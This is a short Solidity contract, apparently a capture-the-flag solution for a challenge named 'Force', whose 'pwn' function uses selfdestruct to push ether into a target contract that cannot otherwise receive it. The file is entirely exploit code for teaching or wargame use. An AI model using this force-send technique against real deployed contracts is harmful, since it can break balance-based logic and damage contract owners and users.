// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "./Force.sol";

contract ForcePayable {
    function pwn(Force _force) external payable {
        require(msg.value > 0);
        selfdestruct(payable(address(_force)));
    }
}
